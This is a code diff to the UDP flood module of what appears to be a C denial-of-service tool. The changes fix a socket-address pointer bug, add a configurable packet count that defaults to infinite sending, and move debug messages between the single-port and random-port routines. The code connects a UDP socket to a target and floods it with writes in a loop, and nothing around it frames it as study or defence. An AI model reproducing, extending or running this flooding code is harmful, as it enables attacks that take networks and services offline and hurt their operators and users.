@@ -12,9 +12,9 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 #include <netinet/in.h>
-#include <unistd.h>
 #include <signal.h>
 #include <string.h>
+#include <unistd.h>
 
 #include <lib/err.h>
 #include <lib/info.h>
@@ -55,36 +55,51 @@ static udp_flood_attack_fn impl;
 // main singleton udp connection
 static conn_t *connection;
 
+// packets
+// how many packets should we send
+// default: 0 = infinity
+static uint64_t packets;
+
 static void single4_port(void)
 {
-	DEBUG("Udp4 flood attack is starting using random ports");
 	//struct sockaddr_in in = *(struct sockaddr_in *)connection->addr;
 	ssize_t n;
-	struct sockaddr_in *in = *(struct sockaddr_in **)connection->addr;
+	struct sockaddr_in in = *(struct sockaddr_in *)connection->addr;
+
 	// if write failures occures we want to handle them where the error
 	// occurs rather than in a sigpipe handler.
-	if(signal(SIGPIPE, SIG_IGN) == SIG_ERR)
+	if (signal(SIGPIPE, SIG_IGN) == SIG_ERR)
 		INFOEE("Failed to ingore the signal pipe");
-	
+
+	DEBUG("Udp4 flood attack is staring using single port");
 	// this does not result in anything like a tcp connection.
 	// we tell the kernel just to check for any immediate errors.
 	// if we use sendto and remove the connect the kernel involves the
 	// 3 steps like : connect the socket, output the fist datagram, unconnectthe socket.
 	// so for calling connect and the write one time involves the this steps by the kernel:
 	// connect the socket , output fist datagram.
-	if(!connect(connection->sock, (SA*)in, sizeof(*in)))
+	if (!connect(connection->sock, (SA *)&in, sizeof(in)))
+		//TODO
 		INFOEE("Udp4 socket can't be connected");
-	
-	for (;;) {
-		n = write(connection->sock, connection->buff, connection->bufflen);
-		if (!n)
-			break;
+
+	//TODO
+	if (!packets) {
+		for (;;) {
+			n = write(connection->sock, connection->buff, connection->bufflen);
+			if (!n)
+				break;
+		}
+	} else {
+		for (uint64_t i = 0; i < packets; i++) {
+			n = write(connection->sock, connection->buff, connection->bufflen);
+			if (!n)
+				break;
+		}
 	}
 }
-
 static void random4_port(void)
 {
-	DEBUG("Udp4 flood attack is staring using single port");
+	DEBUG("Udp4 flood attack is starting using random ports");
 }
 
 static void range4_port(void)
@@ -161,13 +176,14 @@ void udp_flood_init(conn_t *conn, arguments args)
 
 	// assign singleton with the new connection
 	connection = conn;
-
+	packets = args.packets;
 	// now we should test if we are dealing with single,range or random port attack
 	if (args.port.random) {
 		DEBUG("Udp flood is choosing random port attack implementation");
 		impl = RANDOM_PORT(args.host_type);
 		return;
 	}
+
 	if (args.port.n) {
 		DEBUG("Udp flood is choosing single port attack implementation");
 		impl = SINGLE_PORT(args.host_type);
